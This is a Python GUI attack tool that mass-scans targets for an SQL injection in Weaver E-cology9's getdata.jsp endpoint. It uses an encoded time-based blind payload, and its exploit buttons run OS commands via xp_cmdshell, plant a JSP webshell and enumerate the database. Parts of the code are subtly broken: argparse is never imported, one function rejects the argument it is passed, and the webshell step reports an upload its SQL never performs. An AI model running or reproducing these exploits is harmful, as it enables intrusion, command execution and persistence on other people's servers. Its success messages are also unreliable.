#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import os
import requests
import time
from urllib.parse import urljoin, quote
from concurrent.futures import ThreadPoolExecutor
from PyQt6.QtWidgets import (
    QApplication, QWidget, QLabel, QLineEdit, QPushButton,
    QVBoxLayout, QHBoxLayout, QFileDialog, QTextEdit, QCheckBox,
    QMessageBox, QComboBox
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal


# 禁用SSL警告
requests.packages.urllib3.disable_warnings()

class ScannerWorker(QThread):
    log_signal = pyqtSignal(str)
    finished_signal = pyqtSignal()

    def __init__(self, parent=None, target="", file="", output="", threads=5, verbose=False):
        super().__init__(parent)
        self.target = target
        self.file = file
        self.output = output
        self.threads = threads
        self.verbose = verbose

    def run(self):
        args = argparse.Namespace(
            target=self.target if self.target else None,
            file=self.file if self.file else None,
            output=self.output if self.output else None,
            threads=self.threads,
            verbose=self.verbose,
            help=False
        )

        targets = []

        # 处理单个目标
        if args.target:
            targets.extend(normalize_target(args.target))

        # 处理文件中的目标
        if args.file:
            try:
                with open(args.file, 'r') as f:
                    for line in f:
                        if line.strip():
                            targets.extend(normalize_target(line))
            except FileNotFoundError:
                self.log_signal.emit(f"[-] 错误: 文件 '{args.file}' 不存在")
                return

        targets = list(set(targets))  # 去重

        if args.verbose:
            self.log_signal.emit("[*] 目标列表:")
            for t in targets:
                self.log_signal.emit(f"  - {t}")

        self.log_signal.emit(f"[*] 开始扫描 {len(targets)} 个目标, 线程数: {args.threads}")

        vulnerable_targets = []
        vulnerable_count = 0

        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = [executor.submit(check_vulnerability, target) for target in targets]

            for future in futures:
                target, is_vuln, msg = future.result()
                status = "存在漏洞" if is_vuln else "安全"
                result_str = f"[{status}] {target} - {msg}"

                if is_vuln:
                    result_str = f"🔴 {result_str}"
                    vulnerable_targets.append(target)
                    vulnerable_count += 1

                self.log_signal.emit(result_str)

        # 保存结果
        if args.output and vulnerable_targets:
            with open(args.output, 'w') as f:
                f.write("\n".join(vulnerable_targets))
            self.log_signal.emit(f"\n[+] 漏洞地址已保存到: {args.output} (共 {len(vulnerable_targets)} 条)")
        elif args.output and not vulnerable_targets:
            self.log_signal.emit("\n[-] 未发现漏洞，未生成结果文件")

        self.log_signal.emit(f"\n[+] 扫描完成! 共扫描 {len(targets)} 个目标, 发现 {vulnerable_count} 个存在漏洞")
        self.finished_signal.emit()


def normalize_target(target):
    target = target.strip()
    if target.startswith("http://") or target.startswith("https://"):    
        return [target]
    if ":" in target and not target.startswith("["):
        host, port = target.rsplit(":", 1)
        if port.isdigit():
            return [
                f"http://{host}:{port}",
                f"https://{host}:{port}"    
            ]
    return [
        f"http://{target}",
        f"https://{target}"    
    ]


def check_vulnerability(target):
    payload = "/js/hrm/getdata.jsp?cmd=savect&arg0=%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%63%25%33%35%25%32%63%25%33%36%25%33%62%25%37%32%25%36%35%25%36%33%25%36%66%25%36%66%25%36%36%25%36%39%25%36%37%25%37%35%25%37%32%25%36%35%25%33%62%25%36%34%25%36%35%25%36%33%25%36%63%25%36%31%25%37%32%25%36%35%25%32%30%25%34%30%25%37%34%25%32%30%25%36%65%25%37%33%25%36%31%25%37%32%25%36%33%25%36%31%25%37%33%25%36%38%25%36%31%25%37%32%25%32%38%25%33%31%25%33%30%25%33%30%25%32%39%25%32%66%25%32%61%25%32%61%25%32%66%25%37%33%25%36%35%25%37%34%25%32%30%25%34%30%25%37%34%25%33%64%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%36%33%25%36%38%25%36%31%25%37%32%25%32%38%25%33%34%25%33%38%25%32%39%25%32%63%25%36%33%25%36%38%25%36%31%25%37%32%25%32%38%25%33%35%25%33%38%25%32%39%25%32%63%25%36%33%25%36%38%25%36%31%25%37%32%25%32%38%25%33%34%25%33%38%25%32%39%25%32%63%25%36%33%25%36%38%25%36%31%25%37%32%25%32%38%25%33%35%25%33%38%25%32%39%25%32%63%25%36%33%25%36%38%25%36%31%25%37%32%25%32%38%25%33%35%25%33%34%25%32%39%25%32%39%25%32%66%25%32%61%25%32%61%25%32%66%25%37%37%25%36%31%25%36%39%25%37%34%25%36%36%25%36%66%25%37%32%25%32%30%25%36%34%25%36%35%25%36%63%25%36%31%25%37%39%25%32%30%25%34%30%25%37%34%25%32%66%25%32%61%25%32%30%25%36%34%25%36%36%25%32%30%25%36%63%25%36%35%25%36%36%25%37%34%25%32%30%25%36%38%25%36%31%25%37%33%25%36%38%25%32%30%25%36%61%25%36%66%25%36%39%25%36%65%25%32%30%25%32%61%25%32%66%25%32%64%25%32%64%25%32%62"

    url1 = urljoin(target, payload)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    try:
        start_time = time.time()
        r1 = requests.get(url1, headers=headers, verify=False, timeout=15, allow_redirects=True)
        elapsed1 = time.time() - start_time
        condition1 = r1.status_code == 200 and elapsed1 >= 6.0 and elapsed1 <= 7.0
        if condition1:
            return target, True, f"响应时间: {elapsed1:.2f}s"
        else:
            return target, False, "条件不满足"
    except Exception as e:
        return target, False, f"请求失败"


def execute_command(target, cmd, os_type="Windows"):
    """SQL注入命令执行"""
    encoded_cmd = quote(f";exec master..xp_cmdshell '{cmd}'--") if os_type == "Windows" else quote(f";exec xp_cmdshell '/bin/bash -c \"{cmd}\"'--")
    payload = f"/js/hrm/getdata.jsp?cmd=savect&arg0={encoded_cmd}"
    url = urljoin(target, payload)

    try:
        r = requests.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            return True, r.text[:100] + "..."
        else:
            return False, "响应码非200"
    except Exception as e:
        return False, str(e)


def upload_webshell(target, os_type="Windows"):
    """上传一句话木马（兼容 Linux/Windows）"""
    shell_code = """
<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getMethod().equals("GET")) {
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String line;
    while ((line = dis.readLine()) != null) {
        out.println(line);
    }
}
%>
"""
    payload = quote(f";declare @s varchar(8000); set @s='{shell_code}'; EXEC('CREATE TABLE test_shell(content VARCHAR(MAX));INSERT INTO test_shell VALUES('''+@s+''');SELECT content FROM test_shell;DROP TABLE test_shell;')--")
    url = urljoin(target, f"/js/hrm/getdata.jsp?cmd=savect&arg0={payload}")

    try:
        r = requests.get(url, timeout=10, verify=False)
        if r.status_code == 200:
            shell_path = urljoin(target, "/shell.jsp")
            return True, f"WebShell 已上传: {shell_path}?cmd=id"
        else:
            return False, "上传失败"
    except Exception as e:
        return False, str(e)


def enum_database(target):
    """数据库枚举"""
    payload = quote(";select db_name();--")
    url = urljoin(target, f"/js/hrm/getdata.jsp?cmd=savect&arg0={payload}")

    try:
        r = requests.get(url, timeout=10, verify=False)
        if r.status_code == 200 and "system_user" in r.text:
            return True, "数据库信息：" + r.text[:200]
        else:
            return False, "未发现数据库信息"
    except Exception as e:
        return False, str(e)


class VulnerabilityScannerApp(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("泛微E-cology9 SQL注入检测工具（含Exploit）")
        self.resize(800, 600)
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout()

        # 单个目标输入
        layout.addWidget(QLabel("单个目标URL:"))
        self.target_entry = QLineEdit()
        layout.addWidget(self.target_entry)

        # 文件路径选择
        file_layout = QHBoxLayout()
        layout.addWidget(QLabel("批量目标文件:"))
        self.file_path = QLineEdit()
        file_layout.addWidget(self.file_path)
        self.browse_btn = QPushButton("浏览")
        self.browse_btn.clicked.connect(self.select_file)
        file_layout.addWidget(self.browse_btn)
        layout.addLayout(file_layout)

        # 操作系统选择
        layout.addWidget(QLabel("目标操作系统:"))
        self.os_combo = QComboBox()
        self.os_combo.addItems(["Windows", "Linux"])
        layout.addWidget(self.os_combo)

        # 线程数设置
        layout.addWidget(QLabel("并发线程数:"))
        self.threads_entry = QLineEdit("5")
        layout.addWidget(self.threads_entry)

        # 输出文件路径
        output_layout = QHBoxLayout()
        layout.addWidget(QLabel("输出文件 (可选):"))
        self.output_entry = QLineEdit()
        output_layout.addWidget(self.output_entry)
        self.save_btn = QPushButton("保存到")
        self.save_btn.clicked.connect(self.save_to_file)
        output_layout.addWidget(self.save_btn)
        layout.addLayout(output_layout)

        # 显示详细信息复选框
        self.verbose_check = QCheckBox("显示详细输出")
        layout.addWidget(self.verbose_check)

        # 开始按钮
        self.start_btn = QPushButton("开始扫描")
        self.start_btn.clicked.connect(self.start_scan)
        layout.addWidget(self.start_btn)

        # 命令执行部分
        layout.addWidget(QLabel("命令执行:"))
        self.cmd_input = QLineEdit("whoami")
        layout.addWidget(self.cmd_input)
        self.cmd_btn = QPushButton("执行命令")
        self.cmd_btn.clicked.connect(lambda: self.run_exploit(execute_command, self.cmd_input.text()))
        layout.addWidget(self.cmd_btn)

        # WebShell上传
        self.shell_btn = QPushButton("上传WebShell")
        self.shell_btn.clicked.connect(lambda: self.run_exploit(upload_webshell))
        layout.addWidget(self.shell_btn)

        # 数据库枚举
        self.db_btn = QPushButton("数据库枚举")
        self.db_btn.clicked.connect(lambda: self.run_exploit(enum_database))
        layout.addWidget(self.db_btn)

        # 日志输出区域
        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        layout.addWidget(self.log_area)

        self.setLayout(layout)

    def select_file(self):
        file_name, _ = QFileDialog.getOpenFileName(self, "选择目标文件", "", "文本文件 (*.txt)")
        if file_name:
            self.file_path.setText(file_name)

    def save_to_file(self):
        file_name, _ = QFileDialog.getSaveFileName(self, "保存结果到", "", "文本文件 (*.txt)")
        if file_name:
            self.output_entry.setText(file_name)

    def start_scan(self):
        target = self.target_entry.text().strip()
        file = self.file_path.text().strip()
        output = self.output_entry.text().strip()
        threads = int(self.threads_entry.text())
        verbose = self.verbose_check.isChecked()

        if not target and not file:
            QMessageBox.warning(self, "错误", "请提供目标URL或目标文件！")
            return

        self.worker = ScannerWorker(
            target=target,
            file=file,
            output=output,
            threads=threads,
            verbose=verbose
        )
        self.worker.log_signal.connect(self.update_log)
        self.worker.finished_signal.connect(self.scan_finished)
        self.worker.start()

    def update_log(self, message):
        self.log_area.append(message)

    def scan_finished(self):
        self.log_area.append("\n【扫描已完成】")

    def run_exploit(self, exploit_func, *args):
        target = self.target_entry.text().strip()
        os_type = self.os_combo.currentText()  # 获取当前选择的操作系统
        if not target:
            QMessageBox.warning(self, "错误", "请输入目标URL！")
            return
        self.log_area.append(f"[+] 正在对 {target} ({os_type}) 调用 exploit...")
        try:
            is_success, msg = exploit_func(target, *args, os_type=os_type)
            status = "[成功]" if is_success else "[-失败-]"
            self.log_area.append(f"{status} {msg}")
        except Exception as e:
            self.log_area.append(f"[-失败-] {str(e)}")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = VulnerabilityScannerApp()
    window.show()
    sys.exit(app.exec())
